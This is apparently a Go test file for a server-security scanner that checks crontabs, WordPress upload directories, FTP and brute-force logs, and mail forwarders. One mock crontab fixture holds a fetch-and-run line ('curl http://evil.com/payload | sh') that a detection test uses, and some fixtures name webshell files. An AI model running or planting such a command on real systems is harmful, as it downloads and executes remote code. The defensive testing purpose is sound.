package checks

import (
	"context"
	"os"
	"path/filepath"
	"strings"
	"testing"
	"time"

	"github.com/pidginhost/csm/internal/config"
	"github.com/pidginhost/csm/internal/state"
)

// --- CheckCrontabs with suspicious crontab + baseline detection ------

func TestCheckCrontabsWithBaseline(t *testing.T) {
	withMockOS(t, &mockOS{
		glob: func(pattern string) ([]string, error) {
			return []string{"/var/spool/cron/alice"}, nil
		},
		readFile: func(name string) ([]byte, error) {
			return []byte("0 * * * * /usr/bin/backup.sh\n* * * * * curl http://evil.com/payload | sh\n"), nil
		},
	})

	store, err := state.Open(t.TempDir())
	if err != nil {
		t.Fatal(err)
	}
	defer func() { _ = store.Close() }()

	// First call = baseline
	_ = CheckCrontabs(context.Background(), &config.Config{}, store)
	// Second call = detect suspicious entries
	findings := CheckCrontabs(context.Background(), &config.Config{}, store)
	_ = findings
}

// --- CheckFileIndex with previous + current diff ---------------------

func TestCheckFileIndexWithDiff(t *testing.T) {
	stateDir := t.TempDir()
	withMockOS(t, &mockOS{
		readDir: func(name string) ([]os.DirEntry, error) {
			if name == "/home" {
				return []os.DirEntry{testDirEntry{name: "alice", isDir: true}}, nil
			}
			if strings.Contains(name, "uploads") {
				return []os.DirEntry{
					testDirEntry{name: "evil.php", isDir: false},
					testDirEntry{name: "new_webshell.php", isDir: false},
				}, nil
			}
			if strings.Contains(name, "alice") && !strings.Contains(name, "wp-content") {
				return []os.DirEntry{
					testDirEntry{name: "public_html", isDir: true},
				}, nil
			}
			if strings.Contains(name, "public_html") && !strings.Contains(name, "wp-content") {
				return []os.DirEntry{
					testDirEntry{name: "wp-content", isDir: true},
				}, nil
			}
			if strings.Contains(name, "wp-content") && !strings.Contains(name, "uploads") {
				return []os.DirEntry{
					testDirEntry{name: "uploads", isDir: true},
				}, nil
			}
			return nil, os.ErrNotExist
		},
		stat: func(name string) (os.FileInfo, error) {
			return fakeFileInfo{name: "test", size: 100}, nil
		},
	})

	cfg := &config.Config{StatePath: stateDir}
	// First call = baseline
	_ = CheckFileIndex(context.Background(), cfg, nil)
	// Second call = detect new files
	findings := CheckFileIndex(context.Background(), cfg, nil)
	_ = findings
}

// A scan cut short by context cancellation walks only part of the tree, so
// its index is incomplete. Promoting that partial index to the baseline
// would make every un-walked file look "new" next cycle and flood alerts.
// The previous baseline must survive a cancelled scan untouched.
//
// The mock cancels the context after the first account's uploads dir is
// read, so the walk reaches the second account already cancelled and
// returns a partial index that still clears the half-of-previous guard.
func TestCheckFileIndexCanceledScanDoesNotPromoteBaseline(t *testing.T) {
	stateDir := t.TempDir()
	previousPath := filepath.Join(stateDir, "fileindex.previous")
	baseline := "/home/alice/public_html/wp-content/uploads/a.php\n" +
		"/home/bob/public_html/wp-content/uploads/b.php\n"
	if err := os.WriteFile(previousPath, []byte(baseline), 0600); err != nil {
		t.Fatal(err)
	}

	ctx, cancel := context.WithCancel(context.Background())
	withMockOS(t, &mockOS{
		readDir: func(name string) ([]os.DirEntry, error) {
			switch {
			case name == "/home":
				return []os.DirEntry{
					testDirEntry{name: "alice", isDir: true},
					testDirEntry{name: "bob", isDir: true},
				}, nil
			case strings.Contains(name, "alice") && strings.HasSuffix(name, "uploads"):
				// alice's tree walked; cancel before bob is reached.
				cancel()
				return []os.DirEntry{testDirEntry{name: "a.php", isDir: false}}, nil
			case strings.Contains(name, "bob") && strings.HasSuffix(name, "uploads"):
				return []os.DirEntry{testDirEntry{name: "b.php", isDir: false}}, nil
			}
			return nil, os.ErrNotExist
		},
		stat: func(name string) (os.FileInfo, error) {
			return fakeFileInfo{name: "test", size: 100}, nil
		},
	})

	cfg := &config.Config{StatePath: stateDir}
	_ = CheckFileIndex(ctx, cfg, nil)

	got, err := os.ReadFile(previousPath)
	if err != nil {
		t.Fatal(err)
	}
	if string(got) != baseline {
		t.Fatalf("cancelled scan overwrote baseline index:\n got %q\nwant %q", got, baseline)
	}
}

func TestCheckFileIndexNilContextUsesBackground(t *testing.T) {
	stateDir := t.TempDir()
	withMockOS(t, &mockOS{
		readDir: func(name string) ([]os.DirEntry, error) {
			if name == "/home" {
				return nil, nil
			}
			return nil, os.ErrNotExist
		},
		readFile: func(name string) ([]byte, error) {
			if strings.HasPrefix(name, stateDir) {
				return os.ReadFile(name)
			}
			return nil, os.ErrNotExist
		},
		stat: func(name string) (os.FileInfo, error) {
			if strings.HasPrefix(name, stateDir) {
				return os.Stat(name)
			}
			return nil, os.ErrNotExist
		},
	})

	cfg := &config.Config{StatePath: stateDir}
	var ctx context.Context
	findings := CheckFileIndex(ctx, cfg, nil)
	if len(findings) != 0 {
		t.Fatalf("empty scan with nil context returned findings: %+v", findings)
	}
	for _, name := range []string{"fileindex.current", "fileindex.previous"} {
		if _, err := os.Stat(filepath.Join(stateDir, name)); err != nil {
			t.Fatalf("nil-context scan did not write %s: %v", name, err)
		}
	}
}

func TestCheckFileIndexCanceledFirstScanDoesNotSaveDirCache(t *testing.T) {
	stateDir := t.TempDir()
	ctx, cancel := context.WithCancel(context.Background())
	withMockOS(t, &mockOS{
		readDir: func(name string) ([]os.DirEntry, error) {
			switch name {
			case "/home":
				return []os.DirEntry{testDirEntry{name: "alice", isDir: true}}, nil
			case "/home/alice":
				return nil, nil
			case "/home/alice/public_html/wp-content/uploads":
				cancel()
				return []os.DirEntry{testDirEntry{name: "shell.php", isDir: false}}, nil
			}
			return nil, os.ErrNotExist
		},
		stat: func(name string) (os.FileInfo, error) {
			return fakeFileInfo{name: filepath.Base(name), size: 100}, nil
		},
	})

	cfg := &config.Config{StatePath: stateDir}
	_ = CheckFileIndex(ctx, cfg, nil)

	for _, name := range []string{"dircache.json", "fileindex.current", "fileindex.previous"} {
		if _, err := os.Stat(filepath.Join(stateDir, name)); !os.IsNotExist(err) {
			t.Fatalf("cancelled first scan wrote %s: %v", name, err)
		}
	}
}

func TestBuildFileIndexAlreadyCanceledDoesNotReadHomeDirs(t *testing.T) {
	ctx, cancel := context.WithCancel(context.Background())
	cancel()
	withMockOS(t, &mockOS{
		readDir: func(name string) ([]os.DirEntry, error) {
			t.Fatalf("buildFileIndex read %s after starting canceled", name)
			return nil, os.ErrNotExist
		},
		stat: func(name string) (os.FileInfo, error) {
			t.Fatalf("buildFileIndex statted %s after starting canceled", name)
			return nil, os.ErrNotExist
		},
	})

	entries := buildFileIndex(ctx, dirMtimeCache{}, nil, true)
	if len(entries) != 0 {
		t.Fatalf("already-canceled scan returned entries: %v", entries)
	}
}

func TestBuildFileIndexStopsAfterCancellationInsideUploadDir(t *testing.T) {
	ctx, cancel := context.WithCancel(context.Background())
	withMockOS(t, &mockOS{
		readDir: func(name string) ([]os.DirEntry, error) {
			switch name {
			case "/home":
				return []os.DirEntry{testDirEntry{name: "alice", isDir: true}}, nil
			case "/home/alice":
				return nil, nil
			case "/home/alice/public_html/wp-content/uploads":
				cancel()
				return []os.DirEntry{testDirEntry{name: "shell.php", isDir: false}}, nil
			case "/tmp", "/dev/shm", "/var/tmp":
				t.Fatalf("buildFileIndex read %s after cancellation", name)
			}
			return nil, os.ErrNotExist
		},
		stat: func(name string) (os.FileInfo, error) {
			return fakeFileInfo{name: filepath.Base(name), size: 100}, nil
		},
	})

	entries := buildFileIndex(ctx, dirMtimeCache{}, nil, true)
	if len(entries) != 0 {
		t.Fatalf("cancelled scan returned entries: %v", entries)
	}
}

func TestBuildFileIndexStopsAfterCancellationDuringAddonDiscovery(t *testing.T) {
	ctx, cancel := context.WithCancel(context.Background())
	withMockOS(t, &mockOS{
		readDir: func(name string) ([]os.DirEntry, error) {
			switch name {
			case "/home":
				return []os.DirEntry{testDirEntry{name: "alice", isDir: true}}, nil
			case "/home/alice":
				cancel()
				return []os.DirEntry{testDirEntry{name: "example.com", isDir: true}}, nil
			default:
				t.Fatalf("buildFileIndex read %s after cancellation", name)
			}
			return nil, os.ErrNotExist
		},
		stat: func(name string) (os.FileInfo, error) {
			t.Fatalf("buildFileIndex statted %s after cancellation", name)
			return nil, os.ErrNotExist
		},
	})

	entries := buildFileIndex(ctx, dirMtimeCache{}, nil, true)
	if len(entries) != 0 {
		t.Fatalf("cancelled addon discovery returned entries: %v", entries)
	}
}

func TestFileIndexScanHelpersStopWhenDirStatCancels(t *testing.T) {
	const dir = "/home/alice/public_html/wp-content/uploads"
	mtime := time.Unix(1234, 0)

	tests := []struct {
		name string
		scan func(context.Context, dirMtimeCache, map[string][]string, *[]string)
	}{
		{
			name: "php",
			scan: func(ctx context.Context, cache dirMtimeCache, prev map[string][]string, entries *[]string) {
				scanDirForPHPContext(ctx, dir, 3, cache, prev, false, phpHandlerOverlay{}, entries)
			},
		},
		{
			name: "executables",
			scan: func(ctx context.Context, cache dirMtimeCache, prev map[string][]string, entries *[]string) {
				scanDirForExecutablesContext(ctx, dir, 3, cache, prev, false, entries)
			},
		},
		{
			name: "suspicious-ext",
			scan: func(ctx context.Context, cache dirMtimeCache, prev map[string][]string, entries *[]string) {
				scanDirForSuspiciousExtContext(ctx, dir, 3, cache, prev, false, entries)
			},
		},
	}

	for _, tt := range tests {
		t.Run(tt.name, func(t *testing.T) {
			ctx, cancel := context.WithCancel(context.Background())
			withMockOS(t, &mockOS{
				readFile: func(string) ([]byte, error) {
					return nil, os.ErrNotExist
				},
				readDir: func(name string) ([]os.DirEntry, error) {
					t.Fatalf("scan helper read %s after cancellation", name)
					return nil, os.ErrNotExist
				},
				stat: func(name string) (os.FileInfo, error) {
					if name == dir {
						cancel()
						return &fakeFileInfoMtime{name: filepath.Base(name), mtime: mtime, dir: true}, nil
					}
					return nil, os.ErrNotExist
				},
			})

			cache := dirMtimeCache{dir: mtime.Unix()}
			prev := map[string][]string{dir: {filepath.Join(dir, "old.php")}}
			var entries []string

			tt.scan(ctx, cache, prev, &entries)
			if len(entries) != 0 {
				t.Fatalf("cancelled stat carried entries forward: %v", entries)
			}
		})
	}
}

// --- CheckFTPLogins with log data ------------------------------------

func TestCheckFTPLoginsWithMultipleLogins(t *testing.T) {
	logData := ""
	for i := 0; i < 5; i++ {
		logData += "Apr 12 10:00:00 host pure-ftpd: (?@203.0.113.5) [INFO] alice is now logged in\n"
	}

	withMockOS(t, &mockOS{
		open: func(name string) (*os.File, error) {
			if strings.Contains(name, "messages") || strings.Contains(name, "syslog") {
				tmp := t.TempDir() + "/messages"
				_ = os.WriteFile(tmp, []byte(logData), 0644)
				return os.Open(tmp)
			}
			return nil, os.ErrNotExist
		},
		stat: func(name string) (os.FileInfo, error) {
			if strings.Contains(name, "messages") || strings.Contains(name, "syslog") {
				return fakeFileInfo{name: "messages", size: int64(len(logData))}, nil
			}
			return nil, os.ErrNotExist
		},
	})

	_ = CheckFTPLogins(context.Background(), &config.Config{}, nil)
}

// --- getCageFSDisabledUsers with mock --------------------------------

func TestGetCageFSDisabledUsersEnabled(t *testing.T) {
	withMockCmd(t, &mockCmd{
		run: func(name string, args ...string) ([]byte, error) {
			if name == "cagefsctl" && len(args) > 0 && args[0] == "--list-disabled" {
				return []byte("alice\nbob\n"), nil
			}
			return nil, nil
		},
	})

	users := getCageFSDisabledUsers("enabled")
	if len(users) != 2 {
		t.Errorf("got %d users, want 2", len(users))
	}
}

// --- scanDomlogs via CheckWPBruteForce with many POST ----------------

func TestCheckWPBruteForceWithManyPOSTs(t *testing.T) {
	var lines []string
	for i := 0; i < 30; i++ {
		lines = append(lines, `203.0.113.5 - - [12/Apr/2026:10:00:00 +0000] "POST /wp-login.php HTTP/1.1" 200 1234`)
	}
	for i := 0; i < 20; i++ {
		lines = append(lines, `198.51.100.1 - - [12/Apr/2026:10:00:00 +0000] "POST /xmlrpc.php HTTP/1.1" 200 567`)
	}
	logContent := strings.Join(lines, "\n") + "\n"

	withMockOS(t, &mockOS{
		glob: func(pattern string) ([]string, error) {
			if strings.Contains(pattern, "access") || strings.Contains(pattern, "ssl_log") {
				return []string{"/home/alice/access-logs/example.com-ssl_log"}, nil
			}
			return nil, nil
		},
		open: func(name string) (*os.File, error) {
			tmp := t.TempDir() + "/ssl_log"
			_ = os.WriteFile(tmp, []byte(logContent), 0644)
			return os.Open(tmp)
		},
		stat: func(name string) (os.FileInfo, error) {
			return fakeFileInfo{name: "ssl_log", size: int64(len(logContent))}, nil
		},
		readFile: func(name string) ([]byte, error) {
			return []byte(logContent), nil
		},
	})

	findings := CheckWPBruteForce(context.Background(), &config.Config{}, nil)
	_ = findings
}

// --- auditValiasFile with pipe forwarder ----------------------------

func TestAuditValiasFilePipeForwarder(t *testing.T) {
	withMockOS(t, &mockOS{
		open: func(name string) (*os.File, error) {
			tmp := t.TempDir() + "/valias"
			content := "catch: |/usr/local/bin/process_email\ninfo: alice@example.com\nspam: :blackhole:\n"
			_ = os.WriteFile(tmp, []byte(content), 0644)
			return os.Open(tmp)
		},
	})

	localDomains := map[string]bool{"example.com": true}
	findings := auditValiasFile("/etc/valiases/example.com", "example.com", localDomains, &config.Config{})
	if len(findings) == 0 {
		t.Error("pipe forwarder should produce findings")
	}
}

// --- truncate edge cases ---------------------------------------------

func TestTruncateExact(t *testing.T) {
	if got := truncate("hello", 5); got != "hello" {
		t.Errorf("exact length should not truncate, got %q", got)
	}
}
